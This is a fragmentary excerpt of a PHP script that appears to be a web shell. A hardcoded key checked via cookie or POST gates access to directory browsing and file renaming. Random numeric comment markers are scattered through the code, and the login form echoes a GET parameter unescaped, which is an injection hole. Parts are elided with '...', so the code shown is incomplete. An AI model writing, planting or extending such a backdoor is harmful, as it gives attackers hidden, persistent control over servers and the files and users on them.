...
$auth_key = "d83913f65808936060bcf0cd360d9c9d";
...
$pass = false;
if (isset($_COOKIE['pw_name_56906'])) {
    if(($_COOKIE['pw_name_56906']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_56906'])) {
        if(($_POST['pw_name_56906']) == $auth_key) {
            setcookie("pw_name_56906", $_POST['pw_name_56906']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_56906' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1720963731640121 1720963731723939 1720963731863567 1720963731201122
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1720963731640121 1720963731723939 1720963731863567 1720963731201122
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1720963731640121 1720963731723939 1720963731863567 1720963731201122
            $name = PATH . "/" . $_GET['r'];
